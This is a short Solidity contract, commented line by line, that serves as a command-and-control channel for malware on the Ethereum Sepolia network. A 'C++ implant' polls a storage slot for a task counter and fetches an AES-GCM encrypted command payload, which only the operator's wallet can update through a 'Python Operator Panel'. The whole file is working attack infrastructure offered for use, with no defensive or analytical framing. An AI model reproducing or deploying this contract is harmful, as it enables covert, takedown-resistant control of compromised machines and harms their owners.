// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Hub {
    // ------------------------------------------------------------------------
    // EVM STORAGE LAYOUT
    // ------------------------------------------------------------------------
    
    // Slot 0: The task execution counter.
    // The C++ implant polls this specific slot via eth_getStorageAt.
    uint256 private taskId;
    
    // Slot 1: The dynamically sized AES-GCM encrypted payload.
    // Slot 1 holds the array length. The actual data starts at keccak256(1).
    bytes private payload;
    
    // Embedded in Bytecode: The deployer's public address.
    // 'immutable' means this does not consume a storage slot. It is hardcoded 
    // into the runtime bytecode during deployment, saving gas on every read.
    address private immutable operator;

    // ------------------------------------------------------------------------
    // CUSTOM ERRORS
    // ------------------------------------------------------------------------
    
    // Silent revert for unauthorized access. Passing a 4-byte custom error 
    // selector is significantly cheaper than storing and reverting with a string.
    error Unauthorized();

    // ------------------------------------------------------------------------
    // CONSTRUCTOR & LOGIC
    // ------------------------------------------------------------------------

    // Executed exactly once upon deployment to the Sepolia network.
    constructor() {
        // Locks the operator to the MetaMask wallet that signs the deployment transaction.
        operator = msg.sender;
    }

    // The sole entry point for the Python Operator Panel.
    // Using 'calldata' instead of 'memory' prevents the EVM from copying the 
    // payload array into memory before execution, saving gas on large commands.
    function updateTask(uint256 _newTaskID, bytes calldata _newPayload) external {
        // Access Control: Revert immediately if the caller isn't the operator wallet.
        if (msg.sender != operator) {
            revert Unauthorized();
        }

        // State Update (sstore operations)
        taskId = _newTaskID;
        payload = _newPayload;
    }
}